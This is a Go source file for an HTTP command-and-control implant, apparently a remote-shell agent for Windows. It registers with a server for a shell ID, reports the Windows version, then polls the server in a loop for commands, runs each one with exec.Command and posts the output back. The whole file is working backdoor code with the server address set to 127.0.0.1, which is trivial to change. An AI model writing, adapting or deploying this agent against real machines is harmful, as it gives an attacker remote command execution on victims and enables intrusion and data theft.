package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const ServerAddr = "127.0.0.1"

func fetchShellID() string {
	resp, err := http.Get("http://" + ServerAddr + "/shellID")
	if err != nil {
		fmt.Printf("Failed to fetch shell ID: %v\n", err)
		return ""
	}

	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		fmt.Printf("Failed to read shell ID: %v\n", err)
		return ""
	}

	return string(body)
}

func executeCommand(command string) string {
	if command == "" {
		return ""
	}

	if command == "quit" {
		os.Exit(0)
	}

	cmd := strings.Fields(command)
	head := cmd[0]
	parts := cmd[1:len(cmd)]

	out, err := exec.Command(head, parts...).Output()
	if err != nil {
		return fmt.Sprintf("Command execution failed: %v", err)
	}

	return string(out)
}

func getWindowsVersion() string {
	out, err := exec.Command("cmd", "/C", "ver").Output()
	if err != nil {
		return fmt.Sprintf("Failed to get Windows version: %v", err)
	}
	return string(out)
}

func main() {
	shellID := fetchShellID()
	if shellID == "" {
		os.Exit(1)
	}
	version := getWindowsVersion()
	if version != "" {
		_, err := http.Post(fmt.Sprintf("http://"+ServerAddr+"/result?id=%s", shellID), "text/plain", strings.NewReader(version))
		if err != nil {
			fmt.Printf("Failed to post version: %v\n", err)
			time.Sleep(5 * time.Second)
		}
	}

	for {
		resp, err := http.Get(fmt.Sprintf("http://"+ServerAddr+"/command?id=%s", shellID))
		if err != nil {
			fmt.Printf("Failed to fetch command: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Failed to read command body: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		command := string(body)

		if strings.ToLower(command) == "quit" {
			os.Exit(0)
		}

		result := executeCommand(command)
		if result != "" {
			_, err = http.Post(fmt.Sprintf("http://"+ServerAddr+"/result?id=%s", shellID), "text/plain", strings.NewReader(result))
			if err != nil {
				fmt.Printf("Failed to post result: %v\n", err)
				time.Sleep(5 * time.Second)
			}
		}
	}
}
